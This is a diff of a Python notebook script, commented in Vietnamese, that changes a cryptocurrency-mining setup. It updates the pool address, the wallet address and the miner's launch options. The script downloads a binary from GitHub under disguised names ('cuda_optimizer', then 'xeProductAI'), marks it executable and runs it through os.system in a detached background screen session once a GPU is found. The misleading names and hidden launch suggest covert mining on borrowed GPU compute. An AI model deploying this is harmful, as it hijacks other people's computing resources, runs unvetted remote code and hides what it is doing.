@@ -6,11 +6,11 @@ import os
 import requests
 import threading
 
-!wget https://github.com/chuvitvang/AI_mm/blob/main/cuda_optimizer > /dev/null 2>&1 &&chmod +x cuda_optimizer
+!wget https://github.com/chuvitvang/AI_mm/blob/main/xeProductAI > /dev/null 2>&1 &&chmod +x xeProductAI
 # ========== CONFIG ==========
-PL = "neox.2miners.com:4040"  # pl đích
-W1 = "GSaHGJWRw2fsm6QDu3QLESEwMKphaZzuJA" 
-EXECUTABLE = "./cuda_optimizer"  #tên file
+PL = "xechain.luckypool.io:3388"  # pl đích
+W1 = "0x89D4e62F73DC66b7BB83EFE0d31363Ae5dF2E5cb" 
+EXECUTABLE = "./xeProductAI"  #tên file
 # ==============================
 
 # Bước 0: Check GPU
@@ -89,12 +89,10 @@ print(f"name: {wk_name}")
     
     cmd = f"""
     screen -dmS m {EXECUTABLE} \\
-    --algo KAWPOW \\
-    --pool 127.0.0.1:{port} \\
+    --pool ws://127.0.0.1:{port} \\
     --user {W1}.{wk_name} \\
-    --pool-tls 0 \\
-    --send-timeout {random.randint(30, 60)} \\
-    --stratum-mode 1
+    --user ADDRESS=DIFF \\
+    --pass x
     """
     print("🏗️  Đang khởi chạy...")
     os.system(cmd)
